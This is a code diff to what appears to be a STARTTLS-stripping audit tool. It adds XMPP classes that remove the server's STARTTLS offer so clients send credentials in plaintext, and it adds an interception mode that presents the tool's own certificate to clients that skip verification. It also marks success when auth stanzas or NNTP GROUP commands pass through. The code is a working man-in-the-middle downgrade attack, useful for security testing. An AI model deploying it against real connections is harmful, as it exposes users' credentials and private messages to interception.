@@ -630,6 +630,8 @@ class Vectors:
             def mangle_client_data(session, data, rewrite):
                 if "STARTTLS" in data:
                     raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                elif "GROUP " in data:
+                    rewrite.set_result(session, True)
                 return data
         
         class StripWithError:
@@ -644,6 +646,8 @@ class Vectors:
                     session.inbound.sendall("502 Command unavailable\r\n")  # or 580 Can not initiate TLS negotiation
                     logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Command unavailable\r\n")))
                     data=None
+                elif "GROUP " in data:
+                    rewrite.set_result(session, True)
                 return data
     
         class UntrustedIntercept:
@@ -677,6 +681,8 @@ class Vectors:
                     session.outbound.ssl_wrap_socket()
     
                     data=None
+                elif "GROUP " in data:
+                    rewrite.set_result(session, True)
                 return data
     
     class XMPP:
@@ -700,7 +706,82 @@ class Vectors:
                     raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                     #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
                     #data=None
+                elif any(c in data.lower() for c in ("</auth>","<query","<iq","<username")):
+                    rewrite.set_result(session, True)
                 return data 
+
+        class StripInboundTLS:
+            ''' 1) Force Server response to *NOT* announce STARTTLS support
+                2) If starttls is required outbound, leave inbound connection plain - outbound starttls
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if "<starttls" in data:
+                    start = data.index("<starttls")
+                    end = data.index("</starttls>",start)+len("</starttls>")
+                    starttls_args = data[start:end]
+                    data = data[:start] + data[end:]        # strip inbound starttls
+                    if "required" in starttls_args:
+                        # do outbound starttls as required by server
+                        session.outbound.sendall("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
+                        logging.debug("%s [client] => [server][mangled] %s"%(session,repr("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")))
+                        resp_data = session.outbound.recv()
+                        if not resp_data.startswith("<proceed "):
+                            raise ProtocolViolationException("whoop!? server announced STARTTLS *required* but fails to proceed.  proto violation: %s"%repr(resp_data))
+
+                        logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                        session.outbound.ssl_wrap_socket()
+
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "<starttls" in data:
+                    # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
+                    #<failure/> or <proceed/>
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                    #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
+                    #data=None
+                elif any(c in data.lower() for c in ("</auth>","<query","<iq","<username")):
+                    rewrite.set_result(session, True)
+                return data
+
+        class UntrustedIntercept:
+            ''' 1) Do not mangle server data
+                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+                   in case client does not check keys
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "<starttls " in data:
+                    # do inbound STARTTLS
+                    session.inbound.sendall("<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")))
+                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
+                                            keyfile=Vectors._TLS_KEYFILE)
+                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                    # outbound ssl
+
+                    session.outbound.sendall(data)
+                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
+                    resp_data = session.outbound.recv()
+                    if not resp_data.startswith("<proceed "):
+                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+
+                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                    session.outbound.ssl_wrap_socket()
+
+                    data=None
+                elif "</auth>" in data:
+                    rewrite.set_result(session, True)
+                return data
+
+
+
 
 class RewriteDispatcher(object):
     def __init__(self):
